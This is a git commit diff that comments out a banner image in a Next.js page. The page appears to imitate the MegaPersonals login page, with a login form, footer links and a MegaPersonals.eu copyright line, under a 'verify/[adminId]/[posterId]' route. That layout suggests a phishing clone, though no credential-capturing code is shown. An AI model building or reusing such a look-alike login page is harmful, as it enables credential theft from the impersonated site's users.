489ef276ebce06f4d553caa6343cee2b0a25bd3d
Zayn Yusuf <yusue786@gmail.com>
2024-08-31 12:17:01 +0600

    remove banner pic

--- pages/verify/[adminId]/[posterId].js
+++ pages/verify/[adminId]/[posterId].js
@@ -10,26 +10,26 @@ export default function MainPage({ adminId, posterId }) {
 
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
-    <div className="w-[65%] lg:w-full">
+      {/* <div className="w-[65%] lg:w-full">
       <Image src={Megapersonals} alt="megaeprsonals" priority />
+    </div> */}
+
+      <LoginForm />
+
+      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
+        <p className=" cursor-pointer">Home</p>
+        {" | "}
+        <p className=" cursor-pointer">Manage Posts</p>
+        {" | "}
+        <p className=" cursor-pointer">Contact Us</p>
+        {" | "}
+        <p className=" cursor-pointer">Policies & Terms</p>
+      </div>
+
+      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
+        Copyright ©2021 MegaPersonals.eu
+      </p>
     </div>
-
-    <LoginForm />
-
-    <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
-      <p className=" cursor-pointer">Home</p>
-      {" | "}
-      <p className=" cursor-pointer">Manage Posts</p>
-      {" | "}
-      <p className=" cursor-pointer">Contact Us</p>
-      {" | "}
-      <p className=" cursor-pointer">Policies & Terms</p>
-    </div>
-
-    <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
-      Copyright ©2021 MegaPersonals.eu
-    </p>
-  </div>
   );
 }
 
